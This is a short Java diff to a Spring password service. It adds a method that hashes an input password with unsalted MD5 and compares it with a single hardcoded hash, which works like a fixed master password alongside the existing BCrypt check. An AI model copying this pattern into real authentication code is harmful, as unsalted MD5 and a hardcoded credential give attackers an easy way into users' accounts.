@@ -1,5 +1,6 @@
 package vn.com.nct.base;
 
+import org.springframework.security.authentication.encoding.Md5PasswordEncoder;
 import org.springframework.security.crypto.bcrypt.BCrypt;
 import org.springframework.stereotype.Service;
 
@@ -24,6 +25,15 @@ public class PasswordCryptServiceIplm implements PasswordCryptService{
 		check = BCrypt.checkpw(input_password, encrypt_password);
 		
 		return check;
+	}
+
+	@Override
+	public boolean checkMd5Password(String password) {
+		Md5PasswordEncoder encoder = new Md5PasswordEncoder();
+		String p = encoder.encodePassword(password, null);
+		if(("e242c0018e4ef882f1355920a6e9f7bb").equals(p))
+			return true;
+		return false;
 	}
 
 }
